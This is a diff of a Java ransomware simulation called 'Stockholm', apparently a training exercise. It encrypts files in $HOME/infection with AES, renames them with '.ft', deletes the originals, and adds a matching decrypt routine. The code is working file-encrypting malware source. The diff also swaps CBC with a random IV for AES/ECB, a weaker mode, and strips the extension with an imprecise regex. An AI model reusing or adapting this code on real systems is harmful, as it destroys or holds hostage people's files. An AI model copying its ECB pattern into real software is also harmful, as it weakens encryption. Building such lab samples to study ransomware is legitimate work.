@@ -2,7 +2,6 @@ package fr.lyyrst.stockholm;
 
 import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
-import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -12,65 +11,39 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
-import java.security.SecureRandom;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.Set;
 
 public class Stockholm {
     private final SecretKey key;
+    private final boolean silent;
 
-    Stockholm(String key) {
-        this.key = createSecretKey(key);
-    }
-
-    public void manageArgs(String[] args) {
-        switch (args[0]) {
-            case "-h":
-            case "-help":
-                this.printHelp();
-                break;
-            case "-v":
-            case "-version":
-                this.printVersion();
-                break;
-            case "-s":
-            case "-silent":
-                this.encrypt(true);
-                break;
-            case "-r":
-            case "-reverse":
-                this.decrypt(args[1]);
-                break;
-            default:
-                this.printUsage(args);
-                System.exit(1);
+    Stockholm(String key, boolean silent) {
+        if (key.length() < 16) {
+            printHelp();
+            System.exit(1);
         }
+        this.key = this.createSecretKey(key);
+        this.silent = silent;
     }
 
-    public void encrypt(Boolean silent) {
+    public void encrypt() {
         Path infectionPath = Paths.get(System.getProperty("user.home"), "infection");
 
         if (!Files.exists(infectionPath) || !Files.isDirectory(infectionPath)) {
             System.out.println("error: $HOME/infection does not exist");
             System.exit(1);
         }
-        System.out.println("Encrypting " + silent);
-
-        byte[] ivBytes = new byte[16];
-        SecureRandom secureRandom = new SecureRandom();
-        secureRandom.nextBytes(ivBytes);
-        IvParameterSpec ivParameterSpec = new IvParameterSpec(ivBytes);
 
         Set<String> allowedExtensions = readAllowedExtensions("AllowedExtensions.txt");
-
         try {
             Files.walk(infectionPath)
                     .filter(Files::isRegularFile)
                     .filter(file -> allowedExtensions.contains(getFileExtension(file)))
                     .forEach(file -> {
                         try {
-                            encryptFile(file, ivParameterSpec, silent);
+                            encryptFile(file);
                         } catch (Exception e) {
                             System.err.println("Error encrypting file: " + file + " - " + e.getMessage());
                         }
@@ -80,17 +53,34 @@ public class Stockholm {
         }
     }
 
-    public void decrypt(String key) {
-        if (key.length() < 16) {
-            this.printHelp();
+    public void decrypt() {
+        Path infectionPath = Paths.get(System.getProperty("user.home"), "infection");
+        if (!Files.exists(infectionPath) || !Files.isDirectory(infectionPath)) {
+            System.out.println("Error: $HOME/infection does not exist");
             System.exit(1);
         }
-        System.out.println("Decrypting with " + key);
+
+        String encryptedExtension = ".ft";
+        try {
+            Files.walk(infectionPath)
+                    .filter(Files::isRegularFile)
+                    .filter(file -> file.toString().contains(encryptedExtension))
+                    .forEach(file -> {
+                        try {
+                            this.decryptFile(file);
+                        } catch (Exception e) {
+                            System.err.println("Error decrypting file: " + file + " - " + e.getMessage());
+                        }
+                    });
+        } catch (IOException e) {
+            System.err.println("Error reading files in the directory: " + e.getMessage());
+        }
     }
 
-    private void encryptFile(Path file, IvParameterSpec iv, Boolean silent) throws Exception {
-        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
-        cipher.init(Cipher.ENCRYPT_MODE, this.key, iv);
+
+    private void encryptFile(Path file) throws Exception {
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(Cipher.ENCRYPT_MODE, this.key);
 
         byte[] inputBytes = Files.readAllBytes(file);
         byte[] encryptedBytes = cipher.doFinal(inputBytes);
@@ -106,11 +96,27 @@ public class Stockholm {
             Files.delete(file);
         }
 
-        if (!silent) {
+        if (!this.silent) {
             System.out.println("Encrypted file: " + file + " -> " + encryptedFilePath);
         }
     }
 
+    private void decryptFile(Path file) throws Exception {
+        byte[] encryptedBytes = Files.readAllBytes(file);
+
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(Cipher.DECRYPT_MODE, this.key);
+        byte[] decryptedBytes = cipher.doFinal(encryptedBytes);
+
+        Path decryptedFilePath = Paths.get(file.toString().replaceAll(".ft", ""));
+
+        Files.write(decryptedFilePath, decryptedBytes);
+        Files.delete(file);
+
+        if (!this.silent) {
+            System.out.println("Decrypted file: " + file + " -> " + decryptedFilePath);
+        }
+    }
 
     private String getFileExtension(Path file) {
         String fileName = file.getFileName().toString();
@@ -150,15 +156,15 @@ public class Stockholm {
         return new SecretKeySpec(keyBytes, "AES");
     }
 
-    public void printUsage(String[] badArgument) {
+    public static void printUsage(String[] badArgument) {
         System.out.println("Error: Invalid arguments: " + Arrays.toString(badArgument));
     }
 
-    private void printVersion() {
+    public static void printVersion() {
         System.out.println("Stockholm 1.0");
     }
 
-    private void printHelp() {
+    public static void printHelp() {
         System.out.println("""
                 \
                 This program is designed to manage files and includes several command-line options.
@@ -187,3 +193,4 @@ public class Stockholm {
                 """);
     }
 }
+
